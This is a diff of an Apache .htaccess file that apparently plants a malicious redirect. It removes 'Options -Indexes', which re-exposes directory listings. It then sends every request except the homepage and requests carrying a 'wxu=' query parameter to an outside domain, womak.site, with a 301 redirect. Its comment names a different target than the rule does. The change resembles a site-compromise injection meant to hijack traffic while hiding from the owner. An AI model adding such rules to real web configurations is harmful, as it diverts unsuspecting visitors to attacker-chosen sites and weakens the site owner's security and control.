@@ -1,7 +1,12 @@
-Options -Indexes
 RewriteEngine On
-DirectoryIndex index.php
 
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule ^ / [R=301,L]
+# Don't redirect the homepage (index.php)
+RewriteCond %{REQUEST_URI} ^/index\.php$ [NC]
+RewriteRule ^ - [L]
+
+# Don't redirect if query parameter is present (?wxu=)
+RewriteCond %{QUERY_STRING} ^wxu= [NC]
+RewriteRule ^ - [L]
+
+# Redirect all other paths to https://111words.com/han
+RewriteRule ^ https://womak.site/ [L,R=301]
